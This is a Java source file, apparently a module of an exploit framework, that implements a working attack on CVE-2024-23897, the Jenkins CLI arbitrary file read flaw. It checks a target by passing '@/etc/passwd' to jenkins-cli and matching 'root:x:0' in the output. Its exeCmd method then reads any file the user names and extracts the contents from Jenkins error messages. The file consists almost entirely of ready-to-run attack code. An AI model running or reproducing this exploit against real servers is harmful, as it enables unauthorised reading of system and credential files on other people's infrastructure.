package fun.fireline.exp.jenkins;

import fun.fireline.core.ExploitInterface;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class CVE_2024_23897 implements ExploitInterface {

    private boolean isVul = false;
    private String url = "";

    @Override
    public String checkVul(String url) {
        this.url = url;
        String command = "java -jar jenkins-cli.jar -s " + url + " -http help 1 \"@/etc/passwd\"";
        String currdir = System.getProperty("user.dir");
        System.out.println(currdir);
        String line = "";
        String lines = "";
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while((line=reader.readLine())!=null){
                lines += line+'\n';
            }
            if(lines.contains("root:x:0")){
                this.isVul = true;
                return "[+] 目标可能存在CVE-2024-23897 Jenkins CLI 接口任意文件读取漏洞,请从文件读取/命令执行模块输入文件名读取文件,eg:/etc/passwd(只读取第一行);@/etc/passwd(在开启匿名用户可读的情况下可以获取较完整的文件)";
            }
            process.waitFor(10, TimeUnit.SECONDS);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return "[-] 目标可能不存在CVE-2024-23897 Jenkins CLI 接口任意文件读取漏洞";
    }

    @Override
    public String exeCmd(String cmd, String encoding) {
        String url = this.url;
        String line = "";
        String lines = "";
        String payload = "";
        try {
            if(cmd.contains("@")){
                payload = "java -jar jenkins-cli.jar -s " + url + " -http connect-node \"payload\"";
            }else {
                payload = "java -jar jenkins-cli.jar -s " + url + " -http help 1 \"@payload\"";
            }
            payload = payload.replace("payload", cmd);
            System.out.println("exp: "+payload);
            Process process = Runtime.getRuntime().exec(payload);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
            while((line=reader.readLine())!=null){
                lines += line+'\n';
            }
            if(lines.contains("No such file")){
                return "No such file";
            }
            if(lines.contains("Failed to parse")){
                return "Failed to parse";
            }
            if(cmd.contains("@")){
                String result="";
                String lines3="";
                String regex = "\"(.*?)\"";
                Pattern pattern = Pattern.compile(regex);
                Matcher matcher = pattern.matcher(lines);
                while (matcher.find()) {
                    result = matcher.group(1);
                    lines3+=result+"\n";
                }
                return "开启了'匿名用户可读'选项,读取"+cmd.replaceAll("@","")+"内容: \n"+lines3;
            }else {
                    String[] lines2 = lines.split("\n");
                    for(String line2: lines2){
                        if (line2.contains("ERROR: Too many arguments: ")) {
                            String result = line2.substring(line2.indexOf("ERROR: Too many arguments: ") + "ERROR: Too many arguments: ".length());
                            return "读取"+cmd+"内容: "+result;
                        }
                }
            }
            process.waitFor(10, TimeUnit.SECONDS);
        } catch (IOException | InterruptedException e) {
            e.printStackTrace();
        }
        return null;
    }


    @Override
    public boolean isVul() {
        return this.isVul;
    }
}
